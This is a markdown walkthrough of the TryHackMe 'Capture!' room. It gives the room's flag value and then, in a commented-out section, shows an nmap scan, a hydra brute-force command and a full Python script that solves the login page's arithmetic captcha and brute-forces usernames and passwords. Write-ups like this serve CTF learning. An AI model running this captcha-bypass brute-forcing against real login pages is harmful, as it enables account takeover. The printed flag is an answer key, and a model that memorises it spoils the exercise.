
# <div align="center">[Capture!](https://tryhackme.com/r/room/capture)</div>

<div align="center">
  <img src="https://github.com/user-attachments/assets/b80bf4c0-f7c0-4d57-9365-cfec6de6020a" height="200"></img>
</div>

## Task 1. Download the file.
```
No need
```
## Tast 2. Bypass the login form
### What is the value of flag.txt?
```
7df2eabce36f02ca8ed7f237f77ea416
```
## [Lab Material](https://github.com/Esther7171/THM-Walkthroughs/tree/main/Room/Capture!)
<!--## Let make a Nmap scan
```
death@esther:~$ nmap 10.10.236.203 -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 06:37 IST
Nmap scan report for 10.10.236.203
Host is up (0.15s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug/2.2.2 Python/3.8.10
```
## Let en=

## As we have both user and pass file let try to brute force login page using hydra.
```
sudo hydra -L usernames.txt -P passwords.txt 10.10.236.203 http-post-form "/login:username=^USER^&password=^PASS^:Error" -V -t 40
```

## Hydra didnt find anything,but when i try to login just to check it return me an error

![image](https://github.com/user-attachments/assets/0ae972ca-ff87-4f06-bbd0-4d1b34b97989)

* ### Too many bad login attempts!
* ### Captcha enabled
* ### Error: Invalid captcha

## We need to buypass captcha by creating own python script . it took help of [This script](https://github.com/sakibulalikhan/thm-capture/blob/main/capture.py)

```

#! /bin/python3

import requests
import argparse

def solveCaptcha(captcha):
    if captcha[1] == '+':
        ans = int(captcha[0]) + int(captcha[2])
    elif captcha[1] == '-':
        ans = int(captcha[0]) - int(captcha[2])
    elif captcha[1] == '*':
        ans = int(captcha[0]) * int(captcha[2])
    elif captcha[1] == '/':
        ans = int(captcha[0]) / int(captcha[2])
    return ans

def crackUsername(url, captcha):
    print('[+] Starting username brute force...\n')
    f = open('./usernames.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={i.strip()}&password=letmein&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        sReq = sReq.text.split('\n')
        if 'does not exist' not in sReq[104]:
            print(f'!!! Username Found: {i.strip()}\n')
            crackPassword(i.strip(), captcha)
        else:
            captcha = sReq[96].split()

def crackPassword(uName, captcha):
    print('[+] Starting password brute force...\n')
    f = open('./passwords.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={uName}&password={i.strip()}&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if len(sReq.text) < 100:
            print(f'!!! Password Found: {i.strip()}\n')
            print(f'!!! Flag: {sReq.text.split()[1][4:-5]}')
            quit()
        else:
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute force username and password with captcha.')
    parser.add_argument('--host', '-t', type=str, help='Target host URL')
    args = parser.parse_args()

    if args.host:
        url = f'http://{args.host}/login'
        print(f'[+] Starting bruteforce with target URL: {url}\n')
        
        for i in range(0, 10):
            myData = 'username=admin&password=letmein'
            sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

        crackUsername(url, captcha)
    else:
        print("Error: You have to specify the target host using the --host or -t flag.")
        print("Usage: ./script.py --host $IP")
             
```
## Save this in a file and name somthing with .py extention.
### Install the requirments
